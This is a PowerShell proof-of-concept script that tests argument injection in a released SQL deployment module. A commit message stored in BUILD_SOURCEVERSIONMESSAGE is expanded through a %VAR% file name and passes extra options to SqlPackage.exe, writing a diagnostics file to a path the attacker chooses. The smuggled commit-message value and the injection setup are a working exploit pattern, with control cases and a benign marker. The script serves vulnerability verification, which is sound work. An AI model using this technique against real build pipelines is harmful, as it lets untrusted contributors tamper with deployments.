# Does the argv injected past the stop-parsing token reach the REAL SqlPackage.exe as an
# option it acts on? The receiving binary here is Microsoft's own shipped SqlPackage.exe,
# preinstalled on this host. Target server is a local nonexistent instance, so no database
# and no network host is contacted. The marker is a diagnostics log file SqlPackage itself
# writes to an attacker-chosen path.

$ErrorActionPreference = 'Continue'
$here = Split-Path -Parent $MyInvocation.MyCommand.Path
$work = Join-Path $env:RUNNER_TEMP ("spr-" + [guid]::NewGuid().ToString('N').Substring(0,8))
New-Item -ItemType Directory -Force -Path (Join-Path $work 'db') | Out-Null

Write-Output ("PSVersion : " + $PSVersionTable.PSVersion + "   PSEdition : " + $PSVersionTable.PSEdition)

$sqlPackage = (Get-ChildItem "C:\Program Files\Microsoft SQL Server\*\DAC\bin\SqlPackage.exe" | Select-Object -First 1).FullName
Write-Output ("SqlPackage.exe  : " + $sqlPackage)
Write-Output ("version         : " + ((& $sqlPackage /version) -join ' '))
Write-Output ("file version    : " + (Get-Item $sqlPackage).VersionInfo.FileVersion)

# ---- the two functions, lifted verbatim out of the shipped TaskModuleSqlUtility 0.1.7
$nupkg = Join-Path $here 'taskmodulesqlutility-0.1.7.nupkg'
Copy-Item $nupkg (Join-Path $work 'pkg.zip')
Expand-Archive -Path (Join-Path $work 'pkg.zip') -DestinationPath (Join-Path $work 'pkg') -Force
$modFile = (Get-ChildItem -Recurse -Path (Join-Path $work 'pkg') -Filter 'SqlPackageOnTargetMachines.ps1' | Select-Object -First 1).FullName
Write-Output ("module sha256   : " + (Get-FileHash -Algorithm SHA256 $modFile).Hash.ToLower())
function Get-LiftedText([string]$file, [string[]]$names) {
    $tok = $null; $err = $null
    $ast = [System.Management.Automation.Language.Parser]::ParseFile($file, [ref]$tok, [ref]$err)
    $fns = $ast.FindAll({ param($n) $n -is [System.Management.Automation.Language.FunctionDefinitionAst] }, $true)
    $parts = @()
    foreach ($name in $names) {
        $f = $fns | Where-Object { $_.Name -eq $name } | Select-Object -First 1
        Write-Host ("  lifted verbatim : $name lines $($f.Extent.StartLineNumber)-$($f.Extent.EndLineNumber)")
        $parts += $f.Extent.Text
    }
    return ($parts -join "`r`n")
}
. ([scriptblock]::Create((Get-LiftedText $modFile @('Get-SqlPackageCmdArgs','ExecuteCommand'))))

$MARKERDIR = Join-Path $work 'marker'
New-Item -ItemType Directory -Force -Path $MARKERDIR | Out-Null
$MARKER = Join-Path $MARKERDIR 'PWNED-diagnostics'

# The commit message a contributor pushes alongside the file. Unconstrained bytes, and the
# agent places it in the task process environment as BUILD_SOURCEVERSIONMESSAGE.
$env:BUILD_SOURCEVERSIONMESSAGE = 'fix db" /Diagnostics:True /DiagnosticsFile:"' + $MARKER

function Leg([string]$label, [string]$fileName) {
    Write-Host ""
    Write-Host "================ $label"
    Write-Host ("  committed file name : " + $fileName)
    Write-Host ("  commit message      : " + $env:BUILD_SOURCEVERSIONMESSAGE)
    Get-ChildItem $MARKERDIR -ErrorAction SilentlyContinue | Remove-Item -Force -ErrorAction SilentlyContinue
    $dacpac = Join-Path $work ("db\" + $fileName)
    $a = Get-SqlPackageCmdArgs -dacpacFile $dacpac -targetMethod 'server' -serverName 'localhost\NOSUCHINSTANCE' -databaseName 'Fabrikam' -additionalArguments ''
    Write-Host ("  argument string     : " + $a)
    try { $out = ExecuteCommand -FileName $sqlPackage -Arguments $a } catch { $out = "$_" }
    ($out -split "`r?`n") | Where-Object { $_.Trim() } | Select-Object -First 6 | ForEach-Object { Write-Host ("  out> " + $_.Trim()) }
    $found = @(Get-ChildItem $MARKERDIR -ErrorAction SilentlyContinue)
    Write-Host ("  DIAGNOSTICS FILE WRITTEN BY SqlPackage.exe : " + ($found.Count -gt 0))
    foreach ($f in $found) {
        Write-Host ("    path  : " + $f.FullName)
        Write-Host ("    bytes : " + $f.Length)
        (Get-Content $f.FullName -TotalCount 4) | ForEach-Object { Write-Host ("    head> " + $_) }
    }
    return ($found.Count -gt 0)
}

$c1 = Leg 'CONTROL  ordinary file name, same commit message in the environment' 'Fabrikam.dacpac'
$c2 = Leg 'CONTROL  the variable name in the file name WITHOUT percent signs'  'FabBUILD_SOURCEVERSIONMESSAGE.dacpac'
$i1 = Leg 'INJECT   the variable name in the file name WITH percent signs'     'Fab%BUILD_SOURCEVERSIONMESSAGE%.dacpac'

Write-Output ""
Write-Output "================ SUMMARY"
Write-Output ("  CONTROL ordinary name                 diagnostics file written = " + $c1)
Write-Output ("  CONTROL name without percent signs    diagnostics file written = " + $c2)
Write-Output ("  INJECT  name with percent signs       diagnostics file written = " + $i1)
Write-Output "DONE"
